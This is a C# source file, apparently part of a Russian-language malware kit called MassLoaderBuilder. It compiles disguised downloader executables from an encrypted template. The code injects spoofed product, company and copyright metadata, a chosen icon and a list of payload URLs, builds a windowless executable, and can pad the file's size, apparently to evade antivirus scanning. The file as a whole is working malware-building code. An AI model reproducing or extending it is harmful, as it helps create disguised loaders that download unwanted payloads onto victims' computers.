namespace MassLoaderBuilder
{
    #region References

    using System;
    using System.CodeDom.Compiler;
    using System.Collections.Generic;
    using System.Drawing;
    using Microsoft.CSharp;
    using Properties;
    using Tools;

    #endregion

    /*
        Created by r3xq1
        https://github.com/r3xq1/
        Telegram: https://t.me/r3xq1
    */

    public static class SourceEdition
    {
        //#region Список ссылок для работы билда
        //private static readonly List<string> List_of_links = new List<string>
        //{
        //    "System.dll",
        //    "System.Net.dll"
        //};
        //#endregion

        public static void Inizialize(Build collection)
        {
            string exe = $"{collection.BoxFileName}.exe", // Имя Билд файла
                   Source = EncryptKey.Decrypt(Resources.Build, GlobalPath.KEY), // Расшифрованный билд из ресурсов
                   combine = FileManager.CombinePath(GlobalPath.CurrDir, exe); // Путь к билд файлу из текущей директории

            #region Замена исходного кода на новые значения
            Source = Source.Replace("[TITLE]", collection.AssTitle).
                                Replace("[DESCRIPTION]", collection.AssDescription).
                                Replace("[COMPANY]", collection.AssCompany).
                                Replace("[PRODUCT]", collection.AssProduct).
                                Replace("[COPYRIGHT]", collection.AssCopyright).
                                Replace("[VERSION]", collection.AssVersion).
                                Replace("[FILEVERSION]", collection.AssFileVersion).
                                Replace("[GUID]", collection.GuidBox).
                                Replace("[Path]", collection.ComboPath).
                                Replace("\"[URL]\"", collection.ListBoxUrl);
            #endregion
            // Версия .Net для компиляции 4.0 макс для CodeDom (4.5 - Roslyn) 
            var providerOptions = new Dictionary<string, string> { { "CompilerVersion", "v4.0" } };
            try
            {
                using var provider = new CSharpCodeProvider(providerOptions);

                #region Дефолтные параметры для компиляции
                var parameters = new CompilerParameters
                {
                    CompilerOptions = "/target:winexe /optimize+ /platform:anycpu /langversion:Default /noconfig", // Дополнительные параметры для компиляции
                    TreatWarningsAsErrors = false,
                    GenerateInMemory = false,
                    IncludeDebugInformation = false,
                    GenerateExecutable = true,
                    OutputAssembly = exe,
                    ReferencedAssemblies = { "System.dll", "System.Net.dll" }
                };
                //};
                #endregion
                #region Проверка на обнаружение иконки
                if (!string.IsNullOrEmpty(collection.BoxIcon))
                {
                    parameters.CompilerOptions += $" /win32icon:{collection.BoxIcon}"; // Добавляем иконку
                }
                #endregion
                #region Добавление ссылок для компиляции билда
                //for (int i = 0; i < List_of_links.Count; i++)
                //{
                //    parameters.ReferencedAssemblies.Add(List_of_links[i]);
                //}
                #endregion
                #region Компиляция сборки

                CompilerResults ResultLog = provider.CompileAssemblyFromSource(parameters, Source);
                if (!ResultLog.Errors.HasErrors)
                {
                    // Ошибок нету
                    collection.LMessage.Location = new Point(515, 371);
                    ControlActive.CheckMessage(collection.LMessage, "Загрузчик создан успешно!", Color.YellowGreen, 5000);
                    MusicPlay.Inizialize(Resources.GoodBuild);
                    if (collection.NUp.Value > 0) PumpFile.Inizialize(exe, (int)collection.NUp.Value);
                }
                else
                {
                    collection.LMessage.Location = new Point(510, 371);
                    ControlActive.CheckMessage(collection.LMessage, "Ошибка создания загрузчика!", Color.YellowGreen, 5000);
                    MusicPlay.Inizialize(Resources.Error_Build);
                    foreach (CompilerError compilerError in ResultLog.Errors)
                    {
                        FileManager.CreateFile("Error_Compiler.txt", $"Error: {compilerError?.ToString()} {Environment.NewLine}Line: {compilerError?.Line}{Environment.NewLine}");
                    }
                }

                #endregion
            }
            catch (ArgumentNullException aue) { throw new ArgumentNullException("CSharpCodeProvider error", aue); }
        }
    }
}
